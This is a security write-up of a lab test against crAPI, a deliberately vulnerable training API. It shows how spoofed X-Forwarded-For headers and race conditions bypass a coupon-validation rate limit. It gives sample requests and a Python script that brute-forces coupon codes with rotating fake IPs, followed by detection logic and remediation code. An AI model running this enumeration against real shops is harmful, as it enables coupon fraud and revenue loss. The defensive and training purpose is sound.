# Rate Limit Bypass - crAPI Coupon Validation Endpoint

**Date:** February 2, 2026  
**Target:** crAPI (OWASP Completely Ridiculous API)  
**Vulnerability:** API4:2023 - Unrestricted Resource Consumption  
**Severity:** HIGH  
**CVSS Score:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

---

## Executive Summary

A critical rate limiting flaw in crAPI's coupon validation endpoint allows authenticated users to bypass restrictions and validate unlimited coupon codes through IP spoofing and race condition exploitation. This enables brute-force enumeration of valid discount codes, financial fraud, and inventory depletion—direct revenue loss for e-commerce platforms.

**Business Impact:**  
- **Financial Loss:** Unlimited coupon redemptions → direct revenue impact  
- **Inventory Risk:** Attackers claim limited-quantity discounts → stock depletion  
- **Fraud Ecosystem:** Valid codes sold on dark web markets  
- **Brand Damage:** Coupon abuse → customer trust erosion

---

## Vulnerability Details

### Target Endpoint
```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer <jwt_token>
Content-Type: application/json

{"coupon_code":"TEST123"}
```

### Root Cause
The API implements basic rate limiting (10 requests/minute per source IP) but:
1. **Trusts X-Forwarded-For header** → IP spoofing bypasses counter
2. **No atomic counter** → Race conditions (TOCTOU vulnerability)
3. **No CAPTCHA challenge** → Automated attacks feasible
4. **No JWT-based limiting** → Only tracks IP, not authenticated user

---

## Attack Chain

### 1. Reconnaissance
- Created authenticated user: `test@example.com`
- Discovered coupon validation endpoint via traffic analysis
- Endpoint observed: `POST /community/api/v2/coupon/validate-coupon`

### 2. Baseline Test
```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Authorization: Bearer eyJhbGc...

{"coupon_code":"TEST001"}
```

**Result:** First 10 requests → `200 OK`, Next 5 requests → `429 Too Many Requests`

✅ **Confirmed:** Rate limit active at 10 requests/minute

---

### 3. Exploitation - Bypass Technique #1 (IP Spoofing)
```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
X-Forwarded-For: 192.168.1.100  ← Injected header
Authorization: Bearer eyJhbGc...

{"coupon_code":"TEST001"}
```

**Result:** `200 OK` (rate limit bypassed)

**Enumeration Test:**
```
X-Forwarded-For: 192.168.1.101 → 200 OK
X-Forwarded-For: 192.168.1.102 → 200 OK
X-Forwarded-For: 10.0.0.1      → 200 OK
```

Each new IP resets the counter → Unlimited validations

🔥 **Vulnerability Confirmed:** Server blindly trusts X-Forwarded-For

---

### 4. Exploitation - Bypass Technique #2 (Race Condition)

**Attack:** Send 50 simultaneous requests via Burp Intruder

**Configuration:**
- Payload: 50 coupon codes (DISCOUNT10, SAVE20, etc.)
- Concurrency: 50 threads (maximum)
- Timing: <100ms window (atomic counter check fails)

**Result:**  
- 50 requests sent simultaneously  
- 45+ returned `200 OK` (should have been 10 OK + 40 rate limited)  
- Race condition bypassed atomic counter increment

---

## Proof of Concept

### Attack Script (Automated Enumeration)
```python
import requests
import concurrent.futures

base_url = "http://localhost:8888/community/api/v2/coupon/validate-coupon"
headers = {"Authorization": "Bearer eyJhbGc..."}

# Generate 1000 potential codes
codes = [f"DISCOUNT{i}" for i in range(1, 1001)]

def validate_coupon(code, ip):
    payload = {"coupon_code": code}
    headers_spoofed = headers.copy()
    headers_spoofed["X-Forwarded-For"] = f"192.168.1.{ip}"
    
    resp = requests.post(base_url, json=payload, headers=headers_spoofed)
    if resp.status_code == 200:
        print(f"[VALID] {code}")
        return code
    return None

# IP rotation + multithreading
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(validate_coupon, code, i % 255) for i, code in enumerate(codes)]
    valid_codes = [f.result() for f in concurrent.futures.as_completed(futures) if f.result()]

print(f"\n[RESULT] Found {len(valid_codes)} valid coupons in <30 seconds")
```

**Expected Output:**
```
[VALID] DISCOUNT50
[VALID] SAVE20
[VALID] FREESHIP
[RESULT] Found 23 valid coupons in <30 seconds
```

---

## How Akamai API Security Detects This

### Traditional WAF: ❌ BLIND
- **No signature match:** Valid JSON, proper auth, 200 OK status  
- **Rate limiting:** Basic (10 req/min per IP) → Easily bypassed  
- **Verdict:** Allows attack ✅ (false negative)

### Akamai Behavioral Detection: ✅ DETECTS

**Phase 1: Baseline Learning (7-14 days)**
```
Endpoint: POST /community/api/v2/coupon/validate-coupon
Normal behavior:
  - Request rate: 5-10 validations per user session
  - Source pattern: Single IP per session (residential ISP)
  - User-Agent: Browser (not automation tools)
  - Timing: Human speed (2-5 sec between requests)
```

**Phase 2: Anomaly Detection**
```
Attack pattern detected:
  - Request rate: 500 requests in 1 minute (5000% increase)
  - Source pattern: 50 distinct IPs (sequential: 192.168.1.1-50)
  - User-Agent: Identical across all 50 IPs (Burp Suite/2024.1)
  - Timing: Clustered within 100ms window (bot signature)
  - IP Reputation: Hosting provider (AWS/GCP), not residential
```

**Risk Score Calculation:**
```
+30: Volume exceeds baseline by 50x
+25: Sequential IP pattern (192.168.1.X → botnet fingerprint)
+20: Identical User-Agent across IPs (automation)
+15: Hosting provider IPs (not typical user behavior)
+10: Request clustering (<100ms timing)
────
Total: 100/100 (CRITICAL)
```

**Alert Generated:**
```json
{
  "alert_type": "Distributed Rate Limit Abuse + IP Spoofing",
  "severity": "CRITICAL",
  "risk_score": 100,
  "owasp_mapping": "API4:2023 - Unrestricted Resource Consumption",
  "user": "test@example.com",
  "endpoint": "/community/api/v2/coupon/validate-coupon",
  "evidence": {
    "baseline_rate": "5-10 req/session",
    "observed_rate": "500 req/minute",
    "ip_count": 50,
    "user_agent": "Burp Suite/2024.1 (consistent across IPs)",
    "timing_cluster": "100ms window"
  },
  "recommendation": "Block JWT + IP range, implement CAPTCHA"
}
```

**Automated Response Options:**
1. **Block at Edge:** Signal App & API Protector to drop all traffic from JWT token
2. **CAPTCHA Challenge:** Force bot detection challenge for this endpoint
3. **Rate Limit Adjustment:** Reduce global limit to 5 req/min + per-JWT limiting
4. **IP Reputation Block:** Drop traffic from hosting provider ASNs (AWS/GCP/Azure)

---

## Remediation

### Immediate (0-24 hours)
1. **Akamai:** Block attacker's JWT token, implement edge CAPTCHA for `/coupon` endpoint
2. **Customer:** Deploy virtual patch via WAF:
```
   Rule: If (X-Forwarded-For header present) AND (request rate > 10/min)
         Then: Challenge with CAPTCHA
```

### Short-term (1-7 days)
1. **Implement per-JWT rate limiting:**
```python
   from functools import wraps
   from flask_limiter import Limiter
   
   limiter = Limiter(key_func=lambda: get_jwt_identity())
   
   @app.route('/coupon/validate', methods=['POST'])
   @limiter.limit("10 per minute")  # Per authenticated user
   def validate_coupon():
       # existing code
```

2. **Reject untrusted X-Forwarded-For:**
```python
   # Only trust if request originates from known proxy IPs
   TRUSTED_PROXIES = ['10.0.0.1', '10.0.0.2']
   
   if 'X-Forwarded-For' in request.headers:
       if request.remote_addr not in TRUSTED_PROXIES:
           # Ignore header, use request.remote_addr instead
```

3. **Add CAPTCHA after 3 failures:**
```python
   failed_attempts = cache.get(f"coupon_fails:{user_id}")
   if failed_attempts >= 3:
       return {"error": "Complete CAPTCHA to continue"}, 403
```

### Long-term (1-4 weeks)
1. **Replace sequential coupon codes with UUIDs:**
```python
   coupon_code = str(uuid.uuid4())  # Not guessable
```

2. **Implement atomic rate limiting (Redis):**
```python
   import redis
   r = redis.Redis()
   
   key = f"rate_limit:{user_id}:{endpoint}"
   current = r.incr(key)
   if current == 1:
       r.expire(key, 60)  # 60-second window
   if current > 10:
       return {"error": "Rate limit exceeded"}, 429
```

3. **CI/CD Integration:**
```yaml
   # .github/workflows/security.yml
   - name: API Rate Limit Test
     run: |
       akamai-active-test --endpoint /coupon --test rate-limit-bypass
       akamai-active-test --endpoint /coupon --test race-condition
```

4. **Monitor behavioral anomalies:**
   - Alert on: >50 validation attempts per user per day
   - Alert on: Multiple failed validations + 1 success (brute-force pattern)
   - Export metrics to SIEM for correlation

---

## Tools Used
- **Burp Suite Professional** (HTTP interception, Intruder for race conditions)
- **Python requests library** (Automated enumeration script)
- **crAPI** (OWASP vulnerable API for training)

---

## References
- [OWASP API Security Top 10 - API4:2023](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [CWE-770: Allocation of Resources Without Limits](https://cwe.mitre.org/data/definitions/770.html)
- [CAPEC-469: HTTP Flood](https://capec.mitre.org/data/definitions/469.html)

---

## Ethical Statement
This testing was performed in an isolated, deliberately vulnerable training environment (crAPI). No production systems were targeted. All testing conducted for educational purposes in preparation for Akamai Security TAM II interview.

**Date:** February 2, 2026  
**Tester:** Steven Riley  
**Environment:** Local Docker container (crAPI)
